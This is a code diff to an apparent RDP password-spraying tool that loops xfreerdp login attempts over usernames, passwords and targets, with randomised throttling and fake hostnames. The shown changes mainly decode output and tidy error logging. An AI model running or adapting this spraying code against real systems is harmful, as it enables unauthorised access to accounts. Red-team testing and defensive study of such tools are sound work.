@@ -179,9 +179,7 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
         output('Status', 'Username', 'Password', 'Target', output_file_name)
         for target in targets:
             test_RDP = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:\"%s\"" "/sec:nla"
-                                        " /cert-ignore" % (target, domain, "SOCtest",
-                                                           "AllLegitHere"), stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE, shell=True)
+                                        " /cert-ignore" % (target, domain, "SOCtest","AllLegitHere"), stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)
             test_RDP_error = test_RDP.stderr.read()
             if any(word in test_RDP_error for word in failed_to_conn_to_server):
                 LOGGER.error(
@@ -201,7 +199,9 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                             (target, domain, username, password), stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True)
                         output_error = spray.stderr.read()
+                        output_error_decoded = output_error.decode('utf-8') # utf-8 decoded output for log
                         output_info = spray.stdout.read()
+                        output_info_decoded = output_info.decode('utf-8') # utf-8 decoded output for log
                         # throttling requests
                         if random is True:
                             sleep_time = random_time(min_sleep, max_sleep)
@@ -275,11 +275,8 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                             with open(output_file_name + ".log", mode='a') as log_file2:
                                 creds_writer = csv.writer(log_file2, delimiter=',', quotechar='"')
                                 creds_writer.writerow(
-                                    ['Unknown status, check the csv file', username,
-                                     output_error + output_info])
-                            LOGGER.error("[-]Unknown error for %s: on:%s | %s %s", username, target,
-                                         output_error,
-                                         str(output_info))
+                                    ['***USERNAME***', username, '***TARGET***', target, '***OUTPUT ERROR***', output_error_decoded, '***OUTPUT INFO***', output_info_decoded])
+                            LOGGER.error("[-] Unknown error for %s on %s. Check RDPassSpray.log for the verbose (and very ugly) error.", username, target)
 
                         # going over different fake hostnames
                         if attempts_hostname_counter < hostname_loop:
